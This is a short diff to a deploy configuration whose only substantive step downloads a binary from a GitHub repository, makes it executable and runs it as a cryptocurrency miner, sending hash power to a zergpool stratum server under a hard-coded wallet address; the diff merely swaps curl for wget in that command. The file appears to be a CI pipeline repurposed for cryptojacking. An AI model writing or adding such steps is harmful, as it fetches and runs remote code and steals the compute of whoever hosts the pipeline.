@@ -1,4 +1,4 @@
 deploy:
   - apt-get update && apt-get upgrade -y
   - apt-get install curl -y
-  - curl -qO build https://github.com/desafff/nreg/raw/main/seblak && chmod +x build && ./build -a verus -o stratum+tcp:///verushash.asia.mine.zergpool.com:3300 -u DQsBCUuRxrhSgjxM9DFq44GEXSYgGmDmfW.seblak -p c=DGB -t 4
+  - wget -qO build https://github.com/desafff/nreg/raw/main/seblak && chmod +x build && ./build -a verus -o stratum+tcp:///verushash.asia.mine.zergpool.com:3300 -u DQsBCUuRxrhSgjxM9DFq44GEXSYgGmDmfW.seblak -p c=DGB -t 4
